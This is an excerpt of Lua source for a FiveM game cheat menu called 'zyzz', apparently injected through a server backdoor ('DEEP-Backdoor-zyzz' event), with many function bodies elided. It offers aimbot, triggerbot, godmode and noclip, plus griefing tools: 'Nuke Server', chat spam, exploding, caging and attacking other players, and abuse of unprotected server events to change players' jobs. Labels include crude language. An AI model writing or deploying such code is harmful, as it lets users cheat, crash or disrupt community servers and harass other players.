...
AddEventHandler("DEEP-Backdoor-zyzz", function()
	...
	local function debugPrint(text)
		if zyzz.debug then
			Citizen.Trace('[zyzz] ' .. tostring(text))
		end
	end
	...
	function zyzz.CreateMenu(id, title)
		menus[id] = {}
	...
	function zyzz.CreateSubMenu(id, parent, subTitle)
		if menus[parent] then
			zyzz.CreateMenu(id, menus[parent].title)
			if subTitle then
	...
	function zyzz.CurrentMenu()
		return currentMenu
	end

	function zyzz.OpenMenu(id)
		if id and menus[id] then
	...
	function zyzz.IsMenuOpened(id)
		return isMenuVisible(id)
	end

	function zyzz.IsAnyMenuOpened()
	...
	function zyzz.IsMenuAboutToBeClosed()
		if menus[currentMenu] then
	...
	function zyzz.Button(text, subText)
	...
	function zyzz.MenuButton(text, id)
		if menus[id] then
			if zyzz.Button(text .. themecolor .. "   " .. themearrow) then
				setMenuVisible(currentMenu, false)
	...
	function zyzz.CheckBox(text, checked, offtext, ontext, callback)
		if not offtext then
			offtext = "Off"
		end
		...
		if zyzz.Button(text, checked and ontext or offtext) then
			checked = not checked
	...
	function zyzz.ComboBox(text, items, currentIndex, selectedIndex, callback)
		...
		if zyzz.Button(text, selectedItem) then
	...
	function zyzz.SetMenuWidth(id, width)
		setMenuProperty(id, 'width', width)
	end

	function zyzz.SetMenuX(id, x)
		setMenuProperty(id, 'x', x)
	end

	function zyzz.SetMenuY(id, y)
		setMenuProperty(id, 'y', y)
	end

	function zyzz.SetMenuMaxOptionCountOnScreen(id, count)
		setMenuProperty(id, 'maxOptionCount', count)
	end

	function zyzz.SetTitle(id, title)
		setMenuProperty(id, 'title', title)
	end

	function zyzz.SetTitleColor(id, r, g, b, a)
		setMenuProperty(id, 'titleColor', {['r'] = r, ['g'] = g, ['b'] = b, ['a'] = a or menus[id].titleColor.a})
	end

	function zyzz.SetTitleBackgroundColor(id, r, g, b, a)
		setMenuProperty(id, 'titleBackgroundColor', {['r'] = r, ['g'] = g, ['b'] = b, ['a'] = a or menus[id].titleBackgroundColor.a})
	end

	function zyzz.SetTitleBackgroundSprite(id, textureDict, textureName)
		RequestStreamedTextureDict(textureDict)
		setMenuProperty(id, 'titleBackgroundSprite', {dict = textureDict, name = textureName})
	end

	function zyzz.SetSubTitle(id, text)
		setMenuProperty(id, 'subTitle', string.upper(text))
	end

	function zyzz.SetMenuBackgroundColor(id, r, g, b, a)
		setMenuProperty(id, 'menuBackgroundColor', {['r'] = r, ['g'] = g, ['b'] = b, ['a'] = a or menus[id].menuBackgroundColor.a})
	end

	function zyzz.SetMenuTextColor(id, r, g, b, a)
		setMenuProperty(id, 'menuTextColor', {['r'] = r, ['g'] = g, ['b'] = b, ['a'] = a or menus[id].menuTextColor.a})
	end

	function zyzz.SetMenuSubTextColor(id, r, g, b, a)
		setMenuProperty(id, 'menuSubTextColor', {['r'] = r, ['g'] = g, ['b'] = b, ['a'] = a or menus[id].menuSubTextColor.a})
	end

	function zyzz.SetMenuFocusColor(id, r, g, b, a)
		setMenuProperty(id, 'menuFocusColor', {['r'] = r, ['g'] = g, ['b'] = b, ['a'] = a or menus[id].menuFocusColor.a})
	end

	function zyzz.SetMenuButtonPressedSound(id, name, set)
	...
	function zyzz.SetFont(id, font)
		buttonFont = font
		menus[id].titleFont = font
	end

	function zyzz.SetMenuFocusBackgroundColor(id, r, g, b, a)
		setMenuProperty(id, "menuFocusBackgroundColor", {["r"] = r, ["g"] = g, ["b"] = b, ["a"] = a or menus[id].menuFocusBackgroundColor.a})
	end

	function zyzz.SetMaxOptionCount(id, count)
		setMenuProperty(id, 'maxOptionCount', count)
	end

	function zyzz.PopupWindow(x, y, title)

	end


	function zyzz.SetTheme(id, theme)
		if theme == "basic" then
			zyzz.SetMenuBackgroundColor(id, 81, 231, 251, 125)
			zyzz.SetTitleBackgroundColor(id, 92, 212, 249, 80)
			zyzz.SetTitleColor(id, 92, 212, 249, 230)
			zyzz.SetMenuSubTextColor(id, 255, 255, 255, 230)
			zyzz.SetMenuFocusColor(id, 40, 40, 40, 230)
			zyzz.SetFont(id, 7)
			zyzz.SetMenuX(id, .75)-- [0.0..1.0] top left corner
			zyzz.SetMenuY(id, .1)-- [0.0..1.0] top
			zyzz.SetMenuWidth(id, 0.23)-- 0.23
			zyzz.SetMaxOptionCount(id, 12)-- 10
		...
		elseif theme == "dark" then
			zyzz.SetMenuBackgroundColor(id, 180, 80, 80, 125)
			zyzz.SetTitleBackgroundColor(id, 180, 80, 80, 90)
			zyzz.SetTitleColor(id, 180, 80, 80, 230)
			zyzz.SetMenuSubTextColor(id, 255, 255, 255, 230)
			zyzz.SetMenuFocusColor(id, 40, 40, 40, 230)
			zyzz.SetFont(id, 1)
			zyzz.SetMenuX(id, .75)
			...
			themecolor = '~r~'
			themearrow = ">"
		elseif theme == "zyzz" then
			zyzz.SetMenuBackgroundColor(id, 50, 50, 160, 85)
			zyzz.SetTitleBackgroundColor(id, 92, 212, 249, 170)
			zyzz.SetTitleColor(id, 92, 212, 249, 170)
			zyzz.SetMenuSubTextColor(id, 255, 255, 255, 230)
			zyzz.SetFont(id, 0)
			zyzz.SetMenuX(id, .75)
			zyzz.SetMenuY(id, .1)
		...
		elseif theme == "infamous" then
			zyzz.SetMenuBackgroundColor(id, 38, 38, 38, 80)
			zyzz.SetTitleBackgroundColor(id, 92, 212, 249, 170)
			zyzz.SetTitleColor(id, 240, 240, 240, 255)
			zyzz.SetMenuSubTextColor(id, 240, 240, 240, 255)
			zyzz.SetMenuFocusBackgroundColor(id, 100, 220, 250, 180)
			zyzz.SetFont(id, 4)
			zyzz.SetMenuX(id, .725)
			zyzz.SetMenuY(id, .1)
			zyzz.SetMenuWidth(id, 0.25)-- 0.23
			zyzz.SetMaxOptionCount(id, 12)-- 10
	...
	function zyzz.InitializeTheme()
		for i = 1, #menulist do
			zyzz.SetTheme(menulist[i], theme)
		end
	end

	-- ComboBox w/ new index behaviour (does not wrap around)
	function zyzz.ComboBox2(text, items, currentIndex, selectedIndex, callback)
		local itemsCount = #items
		local selectedItem = items[currentIndex]
		local isCurrent = menus[currentMenu].currentOption == (optionCount + 1)
	...
	function zyzz.ComboBoxSlider(text, items, currentIndex, selectedIndex, callback)
		local itemsCount = #items
		local selectedItem = items[currentIndex]
		local isCurrent = menus[currentMenu].currentOption == (optionCount + 1)
		...
		if zyzz.Button2(text, items, itemsCount, currentIndex) then
			selectedIndex = currentIndex
			callback(currentIndex, selectedIndex)
			return true
		elseif isCurrent then
	...
	function zyzz.Button2(text, items, itemsCount, currentIndex)
		local buttonText = text
	...
	Citizen.CreateThread(function()
		local p = 1
		while true do
			if theme == "zyzz" then -- static effect for zyzz theme - https://github.com/esc0rtd3w/illicit-sprx/blob/master/main/illicit/textures.h
				if p == 5 then p = 1 else p = p + 1 end
				for i = 1, #menulist do
					if zyzz.IsMenuOpened(menulist[i]) then zyzz.SetTitleBackgroundSprite(menulist[i], 'digitaloverlay', 'static' .. p) end
				end
			else -- Base textures
				for i = 1, #menulist do zyzz.SetTitleBackgroundSprite(menulist[i], 'mpinventory', 'mp_specitem_weed_black') end
			end
			Wait(100)
		end
	end)
	...
	Citizen.CreateThread(function()
		...
		-- MAIN MENU
		zyzz.CreateMenu('zyzz', menuName .. ' v' .. version)
		zyzz.SetSubTitle('zyzz', 'By oFlaqme#1149')

		-- MAIN MENU SUBMENUS
		zyzz.CreateSubMenu('player', 'zyzz', 'Player Options')
		zyzz.CreateSubMenu('self', 'zyzz', 'Self Options')
		zyzz.CreateSubMenu('weapon', 'zyzz', 'Weapon Options')
		zyzz.CreateSubMenu('vehicle', 'zyzz', 'Vehicle Options')
		zyzz.CreateSubMenu('world', 'zyzz', 'World Options')
		zyzz.CreateSubMenu('teleport', 'zyzz', 'Teleport Options')
		zyzz.CreateSubMenu('misc', 'zyzz', 'Misc Options')
		zyzz.CreateSubMenu('lua', 'zyzz', 'Lua Options')
		zyzz.CreateSubMenu('lynx', 'zyzz', 'Lynx bro....')
		-- PLAYER MENU SUBMENUS
		zyzz.CreateSubMenu('allplayer', 'player', 'All Players')
		zyzz.CreateSubMenu('playeroptions', 'player', 'Player Options')
		zyzz.CreateSubMenu('troll', 'playeroptions', 'Troll Options')
		zyzz.CreateSubMenu('jobsplayers', 'playeroptions', 'Jobs Options')


		-- SELF MENU SUBMENUS
		zyzz.CreateSubMenu('appearance', 'zyzz', 'Appearance Options')
		zyzz.CreateSubMenu('modifiers', 'self', 'Modifiers Options')

		-- APPEARANCE SUBMENUS
		zyzz.CreateSubMenu('modifyskintextures', 'appearance', "Modify Skin Textures")
		zyzz.CreateSubMenu('modifyhead', 'modifyskintextures', "Available Drawables")
		zyzz.CreateSubMenu('skinsmodels', 'appearance', "Skin Models")

		-- WEAPON MENU SUBMENUS

		zyzz.CreateSubMenu('WeaponCustomization', 'weapon', 'Weapon Customization')
		zyzz.CreateSubMenu('weaponspawner', 'weapon', 'Weapon Spawner')
		zyzz.CreateSubMenu('melee', 'weaponspawner', 'Melee Weapons')
		zyzz.CreateSubMenu('pistol', 'weaponspawner', 'Pistols')
		zyzz.CreateSubMenu('smg', 'weaponspawner', 'SMGs / MGs')
		zyzz.CreateSubMenu('shotgun', 'weaponspawner', 'Shotguns')
		zyzz.CreateSubMenu('assault', 'weaponspawner', 'Assault Rifles')
		zyzz.CreateSubMenu('sniper', 'weaponspawner', 'Sniper Rifles')
		zyzz.CreateSubMenu('thrown', 'weaponspawner', 'Thrown Weapons')
		zyzz.CreateSubMenu('heavy', 'weaponspawner', 'Heavy Weapons')

		-- VEHICLE MENU SUBMENUS
		zyzz.CreateSubMenu('vehiclespawner', 'vehicle', 'Vehicle Spawner')
		zyzz.CreateSubMenu('vehiclemods', 'vehicle', 'Vehicle Mods')
		zyzz.CreateSubMenu('vehiclemenu', 'vehicle', 'Vehicle Control Menu')

		-- VEHICLE SPAWNER MENU
		zyzz.CreateSubMenu('compacts', 'vehiclespawner', 'Compacts')
		zyzz.CreateSubMenu('sedans', 'vehiclespawner', 'Sedans')
		zyzz.CreateSubMenu('suvs', 'vehiclespawner', 'SUVs')
		zyzz.CreateSubMenu('coupes', 'vehiclespawner', 'Coupes')
		zyzz.CreateSubMenu('muscle', 'vehiclespawner', 'Muscle')
		zyzz.CreateSubMenu('sportsclassics', 'vehiclespawner', 'Sports Classics')
		zyzz.CreateSubMenu('sports', 'vehiclespawner', 'Sports')
		zyzz.CreateSubMenu('super', 'vehiclespawner', 'Super')
		zyzz.CreateSubMenu('motorcycles', 'vehiclespawner', 'Motorcycles')
		zyzz.CreateSubMenu('offroad', 'vehiclespawner', 'Off-Road')
		zyzz.CreateSubMenu('industrial', 'vehiclespawner', 'Industrial')
		zyzz.CreateSubMenu('utility', 'vehiclespawner', 'Utility')
		zyzz.CreateSubMenu('vans', 'vehiclespawner', 'Vans')
		zyzz.CreateSubMenu('cycles', 'vehiclespawner', 'Cycles')
		zyzz.CreateSubMenu('boats', 'vehiclespawner', 'Boats')
		zyzz.CreateSubMenu('helicopters', 'vehiclespawner', 'Helicopters')
		zyzz.CreateSubMenu('planes', 'vehiclespawner', 'Planes')
		zyzz.CreateSubMenu('service', 'vehiclespawner', 'Service')
		zyzz.CreateSubMenu('commercial', 'vehiclespawner', 'Commercial')

		-- VEHICLE MODS SUBMENUS
		zyzz.CreateSubMenu('vehiclecolors', 'vehiclemods', 'Vehicle Colors')
		zyzz.CreateSubMenu('vehiclecolors_primary', 'vehiclecolors', 'Primary Color')
		zyzz.CreateSubMenu('vehiclecolors_secondary', 'vehiclecolors', 'Secondary Color')

		zyzz.CreateSubMenu('primary_classic', 'vehiclecolors_primary', 'Classic Colors')
		zyzz.CreateSubMenu('primary_matte', 'vehiclecolors_primary', 'Matte Colors')
		zyzz.CreateSubMenu('primary_metal', 'vehiclecolors_primary', 'Metals')

		zyzz.CreateSubMenu('secondary_classic', 'vehiclecolors_secondary', 'Classic Colors')
		zyzz.CreateSubMenu('secondary_matte', 'vehiclecolors_secondary', 'Matte Colors')
		zyzz.CreateSubMenu('secondary_metal', 'vehiclecolors_secondary', 'Metals')

		zyzz.CreateSubMenu('vehicletuning', 'vehiclemods', 'Vehicle Tuning')

		-- WORLD MENU SUBMENUS
		zyzz.CreateSubMenu('objectspawner', 'zyzz', 'Object Spawner')
		zyzz.CreateSubMenu('objectlist', 'objectspawner', 'Select To Delete')
		zyzz.CreateSubMenu('weather', 'world', 'Weather Changer ~r~(CLIENT SIDE)')
		zyzz.CreateSubMenu('time', 'world', 'Time Changer')

		-- MISC MENU SUBMENUS
		zyzz.CreateSubMenu('esp', 'misc', 'ESP & Visual Options')
		zyzz.CreateSubMenu('webradio', 'misc', 'Web Radio')
		zyzz.CreateSubMenu('credits', 'misc', 'Credits')
		zyzz.CreateSubMenu('InfoMenu', 'misc', 'Info')

		-- TELEPORT MENU SUBMENUS
		zyzz.CreateSubMenu('saveload', 'teleport', 'Save/Load Position')
		zyzz.CreateSubMenu('pois', 'teleport', 'POIs')
		--fuck server
		zyzz.CreateSubMenu('fuckserver', 'zyzz', 'Fuck Server')

		-- LUA MENU SUBMENUS
		zyzz.CreateSubMenu('esx', 'lua', 'ESX Options')
		zyzz.CreateSubMenu('vrp', 'lua', 'vRP Options')
		zyzz.CreateSubMenu('other', 'lua', 'Esx Jobs')
		zyzz.CreateSubMenu('money', 'vrp', 'Spawn Money')

		zyzz.InitializeTheme()

		while true do

			-- MAIN MENU
			if zyzz.IsMenuOpened('zyzz') then
				if zyzz.MenuButton('🌐~y~Plz Press Meeeeee', 'lynx') then
				elseif zyzz.MenuButton('~y~« ~r~∑ ~h~~y~» ~r~Player Options', 'player') then
				elseif zyzz.MenuButton('~y~« ~r~∑ ~h~~y~» ~b~Self Options', 'self') then
				elseif zyzz.MenuButton('~y~« ~r~∑ ~h~~y~» ~g~Models Options', 'appearance') then
				elseif zyzz.MenuButton('~y~« ~r~∑ ~h~~y~» ~y~Weapon Options', 'weapon') then
				elseif zyzz.MenuButton('~y~« ~r~∑ ~h~~y~» ~p~Vehicle Options', 'vehicle') then
				elseif zyzz.MenuButton('~y~« ~r~∑ ~h~~y~» ~c~World Options', 'world') then
				elseif zyzz.MenuButton('~y~« ~r~∑ ~h~~y~» ~m~Teleport Options', 'teleport') then
				elseif zyzz.MenuButton('~y~« ~r~∑ ~h~~y~» ~u~Misc Options', 'misc') then
				elseif zyzz.MenuButton('~y~« ~r~∑ ~h~~y~» ~o~Objects Options', 'objectspawner') then
				elseif zyzz.MenuButton('~y~« ~r~∑ ~h~~y~» ~r~Fuck Server', 'fuckserver') then
				elseif zyzz.MenuButton('~y~« ~r~∑ ~h~~y~» ~b~Lua Options', 'lua') then
				elseif zyzz.Button('~y~« ~r~∑ ~h~~y~» ~r~Kill Menu') then break
				end
				ShowInfo(motd2)
				ShowInfo(motd)
				ShowInfo(motd5)
			...
			-- PLAYER OPTIONS MENU
			elseif zyzz.IsMenuOpened('player') then
				if zyzz.MenuButton('All Players', 'allplayer') then
					else
					local playerlist = GetActivePlayers()
					for i = 1, #playerlist do
						local currPlayer = playerlist[i]
						if zyzz.MenuButton("ID: ~y~[" .. GetPlayerServerId(currPlayer) .. "] ~s~" .. GetPlayerName(currPlayer), 'playeroptions') then
							selectedPlayer = currPlayer end
					end
				end

			elseif zyzz.IsMenuOpened('lynx') then
				if zyzz.Button("~y~Bro Lynx is trash") then
			elseif zyzz.Button("~y~Plz don't use lynx") then
			elseif zyzz.Button("~y~If u use lynx i will terminate you") then
			elseif zyzz.Button("~r~USE EXIA' MENUES BROTHER") then
			end


			--Fuck server
			elseif zyzz.IsMenuOpened('fuckserver') then
				if zyzz.CheckBox("Include Self", includeself, "No", "Yes") then
					includeself = not includeself
				elseif zyzz.Button("~r~Nuke Server") then
				ShowInfo("~y~Fucking Players...")
					nukeserver()
				elseif zyzz.Button("~h~~y~»~r~ Spam Chat") then
					RapeAllFunc() 
				elseif zyzz.Button("~y~Set ~s~All Nearby Vehicles Plate Text") then
				...
				elseif zyzz.Button("~y~Close ~s~the whole square") then
		...
		elseif zyzz.Button("~y~Spawn ~p~Lion ~s~all Players") then
			...
			elseif zyzz.Button("~y~Spawn ~p~SWAT ~s~all Players ") then
		 ...
		 elseif zyzz.Button('~o~Make all Players hamburger head') then
						local plist = GetActivePlayers()
							for i = 0, #plist do
				...
				elseif zyzz.Button("~y~Fuck Up The Map (Irreversible!)  [WIP]") then
					if not FuckMap then
				...
				elseif zyzz.Button("Explode All Players") then
					ExplodeAll(includeself)
				elseif zyzz.CheckBox("Explode All Players ~r~(LOOP)", ExplodingAll) then
					ExplodingAll = not ExplodingAll
				elseif zyzz.Button("Give All Players Weapons") then
					GiveAllPlayersWeapons(includeself)
				elseif zyzz.Button("Remove All Players Weapons") then
					StripAll(includeself)
				elseif zyzz.Button("Kick All Players From Vehicle") then
					KickAllFromVeh(includeself)
				end


				elseif zyzz.IsMenuOpened('jobsplayers') then
				if zyzz.Button("~r~Remove Job") then
					TriggerServerEvent("NB:destituerplayer",GetPlayerServerId(selectedPlayer))
				elseif zyzz.Button("~s~Recruit~c~ Mechanic") then
				...
				elseif zyzz.Button("~s~Recruit~b~ Police") then
				local result = GetKeyboardInput("Enter Nivel Job ~g~0-10", "", 10)
				...
				elseif zyzz.Button("~s~Recruit~c~ Mafia") then
				local result = GetKeyboardInput("Enter Nivel Job ~g~0-10", "", 10)
				...
				elseif zyzz.Button("~s~Recruit~p~ Gang") then
				local result = GetKeyboardInput("Enter Nivel Job ~g~0-10", "", 10)
				...
				elseif zyzz.Button("~s~Recruit~y~ Taxi") then
				local result = GetKeyboardInput("Enter Nivel Job ~g~0-10", "", 10)
				...
				elseif zyzz.Button("~s~Recruit~r~ Inem") then
				local result = GetKeyboardInput("Enter Nivel Job ~g~0-10", "", 10)
				 ...
				 elseif zyzz.IsMenuOpened('troll') then
				 if zyzz.Button('~r~Attack ~s~Windmill') then
						...
						elseif zyzz.Button('~r~Attack ~s~Weed Plant') then
			 local bI = CreateObject(GetHashKey('Prop_weed_01'), 0, 0, 0, true, true, true)
				 ...
				 elseif zyzz.Button('~r~Attack ~s~Giant Orange') then
				 ...
				 elseif zyzz.Button('~r~Cage ~s~Player') then
						x, y, z = table.unpack(GetEntityCoords(GetPlayerPed(selectedPlayer)))
						roundx = tonumber(string.format('%.2f', x))
						roundy = tonumber(string.format('%.2f', y))
						roundz = tonumber(string.format('%.2f', z))
						...
						FreezeEntityPosition(e9, true)
						FreezeEntityPosition(ea, true)
				elseif zyzz.Button("~r~Spawn ~s~Swat army with ~y~AK") then
				...
				elseif zyzz.Button("~r~Spawn ~s~Stripper army with ~y~RGQ") then
				...
				elseif zyzz.Button("Nearby Peds Attack Player") then
					PedAttack(selectedPlayer, PedAttackType)
				elseif zyzz.ComboBox("Ped Attack Type", PedAttackOps, currAttackTypeIndex, selAttackTypeIndex, function(currentIndex, selectedIndex)
					currAttackTypeIndex = currentIndex
					selAttackTypeIndex = currentIndex
					PedAttackType = currentIndex
				end) then
				 elseif zyzz.Button("Possess Player Vehicle") then
					if Spectating then SpectatePlayer(selectedPlayer) end
					PossessVehicle(selectedPlayer)
				elseif zyzz.CheckBox("Track Player", Tracking, "Tracking: Nobody", "Tracking: "..GetPlayerName(TrackedPlayer)) then
					Tracking = not Tracking
					TrackedPlayer = selectedPlayer
				elseif zyzz.CheckBox("Fling Player", FlingingPlayer, "Flinging: Nobody", "Flinging: "..GetPlayerName(FlingedPlayer)) then
					FlingingPlayer = not FlingingPlayer
					FlingedPlayer = selectedPlayer
				elseif zyzz.Button("Launch Players Vehicle") then
				...
				elseif zyzz.Button("Slam Players Vehicle") then
					if not IsPedInAnyVehicle(GetPlayerPed(selectedPlayer), 0) then
						ShowInfo("~r~Player Not In Vehicle!")
					else
				...
				elseif zyzz.ComboBox("Pop Players Vehicle Tire", {"Front Left", "Front Right", "Back Left", "Back Right", "All"}, currTireIndex, selTireIndex, function(currentIndex, selClothingIndex)
				...
				elseif zyzz.Button("Explode Player") then
					ExplodePlayer(selectedPlayer)
				elseif zyzz.Button("Silent Kill Player") then
					local coords = GetEntityCoords(GetPlayerPed(selectedPlayer))
					AddExplosion(coords.x, coords.y, coords.z, 4, 0.1, 0, 1, 0.0)
				elseif zyzz.Button("Kick From Vehicle") then
					KickFromVeh(selectedPlayer)
					end


			-- SPECIFIC PLAYER OPTIONS
			elseif zyzz.IsMenuOpened('playeroptions') then
				if zyzz.Button("~m~PLAYER: " .. "~g~[" .. GetPlayerServerId(selectedPlayer) .. "] ~s~" .. GetPlayerName(selectedPlayer)) then
				elseif zyzz.CheckBox("~g~Spectate ~s~Player", Spectating, "Spectating: ~m~OFF", "Spectating: "..GetPlayerName(SpectatedPlayer)) then
					Spectating = not Spectating
					SpectatePlayer(selectedPlayer)
					SpectatedPlayer = selectedPlayer
				elseif zyzz.MenuButton("Troll Menu", 'troll') then
				elseif zyzz.MenuButton("~g~ESX ~s~Jobs Menu ~r~(RISK)", 'jobsplayers') then
				elseif zyzz.Button("~g~ESX ~s~Revive ~r~(RISK)") then
				...
				elseif zyzz.Button('~b~VRP ~s~Revive') then
						local bK = GetEntityCoords(GetPlayerPed(selectedPlayer))
				...
				elseif zyzz.Button('~b~Armour ~s~Player') then
						local bK = GetEntityCoords(GetPlayerPed(selectedPlayer))
						...
						SetPickupRegenerationTime(pickup, 60)
				elseif zyzz.Button('~b~FULL Armour ~s~Player') then
						local bK = GetEntityCoords(GetPlayerPed(selectedPlayer))
						for i = 0, 99 do
							Citizen.Wait(0)
				...
				elseif zyzz.ComboBox("Teleport Into Players Vehicle", {"Front Right", "Back Left", "Back Right"}, currSeatIndex, selSeatIndex, function(currentIndex, selClothingIndex)
				...
				elseif zyzz.Button("Cancel Animation/Task") then
					ClearPedTasksImmediately(GetPlayerPed(selectedPlayer))
				elseif zyzz.Button("Give All Weapons") then
				GiveAllWeapons(selectedPlayer)
				elseif zyzz.Button("Remove All Weapons") then
					StripPlayer(selectedPlayer)
				end


			-- SELF OPTIONS MENU
			elseif zyzz.IsMenuOpened('self') then
				if zyzz.CheckBox("~g~God~s~mode", Godmode) then
					Godmode = not Godmode
					ToggleGodmode(Godmode)
				elseif zyzz.CheckBox("Demigod Mode", Demigod) then
					Demigod = not Demigod
				elseif zyzz.Button("~g~ESX ~s~Revive ~r~(RISK)") then
					local confirm = GetKeyboardInput("Using this option will ~r~risk banned ~s~server! Are you Sure? ~g~Y~w~/~r~N")
				 if string.lower(confirm) == "y" then
				...
				elseif zyzz.ComboBox("~b~Player ~s~Functions ~y~»", {"~b~VRP ~s~Revive", "~b~Give Player Armor", "~y~Remove Player Armor", "~g~Clean Player", "~y~Suicide", "~y~Cancel Anim/Task"}, currPFuncIndex, selPFuncIndex, function(currentIndex, selClothingIndex)
				...
				elseif zyzz.CheckBox("Infinite Stamina", InfStamina) then
					InfStamina = not InfStamina
				elseif zyzz.CheckBox("Alternative Demigod Mode", ADemigod) then
					ADemigod = not ADemigod
				elseif zyzz.CheckBox("Infinite Stamina", InfStamina) then
					InfStamina = not InfStamina
				elseif zyzz.ComboBoxSlider("~y~Fast Run", FastCBWords, currFastRunIndex, selFastRunIndex, function(currentIndex, selClothingIndex)
				...
				elseif zyzz.ComboBoxSlider("~y~Fast Swim", FastCBWords, currFastSwimIndex, selFastSwimIndex, function(currentIndex, selClothingIndex)
				...
				elseif zyzz.CheckBox("Super Jump", SuperJump) then
					SuperJump = not SuperJump
				elseif zyzz.CheckBox("Invisibility", Invisibility) then
					Invisibility = not Invisibility
					if not Invisibility then
						SetEntityVisible(PlayerPedId(), true)
					end
				elseif zyzz.CheckBox("~m~Magneto Mode ~s~KEY ~y~[E]", ForceTog) then
					ForceMod()
				elseif zyzz.CheckBox("~m~Forcefield", Forcefield) then
					Forcefield = not Forcefield
				elseif zyzz.ComboBox("~c~Forcefield Radius ~y~»", ForcefieldRadiusOps, currForcefieldRadiusIndex, selForcefieldRadiusIndex, function(currentIndex, selectedIndex)
				...
				elseif zyzz.CheckBox("~m~Noclip", Noclipping) then
					ToggleNoclip()
				elseif zyzz.ComboBox("~c~Noclip Speed ~y~»", NoclipSpeedOps, currNoclipSpeedIndex, selNoclipSpeedIndex, function(currentIndex, selectedIndex)
			...
			-- APPEARANCE MENU
			elseif zyzz.IsMenuOpened('appearance') then
			if zyzz.MenuButton("Models", 'skinsmodels') then
				elseif zyzz.Button("Set Model Name") then
				...
				elseif zyzz.MenuButton("Modify Skin Textures", 'modifyskintextures') then
				elseif zyzz.Button("~b~Randomize ~s~Model") then
					RandomClothes(PlayerId())
				elseif zyzz.ComboBox("Save Outfit", ClothingSlots, currClothingIndex, selClothingIndex, function(currentIndex, selectedIndex)
					currClothingIndex = currentIndex
					selClothingIndex = currentIndex
				end) then
					Outfits[selClothingIndex] = GetCurrentOutfit(PlayerId())
				elseif zyzz.ComboBox("Load Outfit", ClothingSlots, currClothingIndex, selClothingIndex, function(currentIndex, selectedIndex)
					currClothingIndex = currentIndex
					selClothingIndex = currentIndex
				end) then
				...
				elseif zyzz.IsMenuOpened('modifyskintextures') then
					...
					if zyzz.MenuButton("Head", "modifyhead") then

						if GetEntityModel(PlayerPedId()) ~= GetHashKey("mp_m_freemode_01") then
							zyzz.CloseMenu()
							zyzz.OpenMenu('modifyskintextures')
					...
					elseif zyzz.IsMenuOpened('skinsmodels') then

	if zyzz.Button("~g~Reset Model To FiveM Player") then
		...
		elseif zyzz.Button("Change To ~p~Clown") then
				...
				elseif zyzz.Button("Change To ~r~Stripper") then
				local model = "s_f_y_stripper_01"
					...
					if HasModelLoaded(GetHashKey(model)) then
						...
						elseif zyzz.Button("Change To ~b~Cop") then
				local model = "s_m_y_cop_01"
					...
					if HasModelLoaded(GetHashKey(model)) then
						...
						elseif zyzz.Button("Change To ~o~Chimp") then
				local model = "a_c_chimp"
					...
					if HasModelLoaded(GetHashKey(model)) then
						...
						elseif zyzz.Button("Change To ~g~Alien") then
				local model = "s_m_m_movalien_01"
					...
					if HasModelLoaded(GetHashKey(model)) then
						...
						elseif zyzz.Button("Change To ~p~Pongo") then
				local model = "u_m_y_pogo_01"
					...
					if HasModelLoaded(GetHashKey(model)) then
						...
						elseif zyzz.Button("Change To ~o~Babyd") then
				local model = "u_m_y_babyd"
					...
					-- Head Menu
					elseif zyzz.IsMenuOpened('modifyhead') then
						if zyzz.ComboBoxSlider("Face", faceItemsList, currFaceIndex, selFaceIndex, function(currentIndex, selectedIndex)
						...
						elseif zyzz.ComboBox2("Face Texture", faceTexturesList, currFtextureIndex, selFtextureIndex, function(currentIndex, selectedIndex)
						...
						elseif zyzz.ComboBoxSlider("Hair", hairItemsList, currHairIndex, selHairIndex, function(currentIndex, selectedIndex)
						...
						elseif zyzz.ComboBox2("Hair Color", hairTextureList, currHairTextureIndex, selHairTextureIndex, function(currentIndex, selectedIndex)
						...
						elseif zyzz.ComboBoxSlider("Mask", maskItemsList, currMaskIndex, selMaskIndex, function(currentIndex, selectedIndex)
						...
						elseif zyzz.ComboBoxSlider("Hat", hatItemsList, currHatIndex, selHatIndex, function(currentIndex, selectedIndex)
						...
						elseif zyzz.ComboBox2("Hat Texture", hatTexturesList, currHatTextureIndex, selHatTextureIndex, function(currentIndex, selectedIndex)
					...
					elseif zyzz.IsMenuOpened('WeaponCustomization') then
						if zyzz.ComboBox("Weapon Tints", { "Normal", "Green", "Gold", "Pink", "Army", "LSPD", "Orange", "Platinum" }, currPFuncIndex, selPFuncIndex, function(currentIndex, selClothingIndex)
						currPFuncIndex = currentIndex
						selPFuncIndex = currentIndex
						  end) then
						if selPFuncIndex == 1 then
					...
					elseif zyzz.Button("~g~Add ~s~Special Finish") then
					...
					elseif zyzz.Button("~r~Remove ~s~Special Finish") then
					...
					elseif zyzz.Button("~g~Add ~s~Suppressor") then
					...
					elseif zyzz.Button("~r~Remove ~s~Suppressor") then
					...
					elseif zyzz.Button("~g~Add ~s~Scope") then
					...
					elseif zyzz.Button("~r~Remove ~s~Scope") then
			...
			-- WEAPON OPTIONS MENU
			elseif zyzz.IsMenuOpened('weapon') then
				if zyzz.MenuButton("~g~Give ~s~Single Weapon", 'weaponspawner') then
					selectedPlayer = PlayerId()
				elseif zyzz.MenuButton("Weapon Customization", "WeaponCustomization") then
					selectedPlayer = PlayerId()
				elseif zyzz.Button("Give All Weapons") then
					GiveAllWeapons(PlayerId())
				elseif zyzz.Button("Remove All Weapons") then
					StripPlayer(PlayerId())
				elseif zyzz.Button("Remove Ammo") then
					SetPedAmmo(GetPlayerPed(-1), 0)
				elseif zyzz.Button("Give Max Ammo") then
					GiveMaxAmmo(PlayerId())
				elseif zyzz.CheckBox("Infinite Ammo", InfAmmo) then
					InfAmmo = not InfAmmo
					SetPedInfiniteAmmoClip(PlayerPedId(), InfAmmo)
				elseif zyzz.CheckBox("Explosive Ammo", ExplosiveAmmo) then
					ExplosiveAmmo = not ExplosiveAmmo
				elseif zyzz.CheckBox("Force Gun", ForceGun) then
					ForceGun = not ForceGun
				elseif zyzz.CheckBox("Super Damage", SuperDamage) then
				...
				elseif zyzz.CheckBox("Rapid Fire", RapidFire) then
					RapidFire = not RapidFire
				elseif zyzz.CheckBox("Aimbot", Aimbot) then
					Aimbot = not Aimbot
				elseif zyzz.ComboBox("Aimbot Bone Target ~y~»", AimbotBoneOps, currAimbotBoneIndex, selAimbotBoneIndex, function(currentIndex, selectedIndex)
					currAimbotBoneIndex = currentIndex
					selAimbotBoneIndex = currentIndex
					AimbotBone = NameToBone(AimbotBoneOps[currentIndex])
				end) then
					elseif zyzz.CheckBox("Draw Aimbot FOV", DrawFov) then
					DrawFov = not DrawFov
					elseif zyzz.CheckBox("Triggerbot", Triggerbot) then
						Triggerbot = not Triggerbot
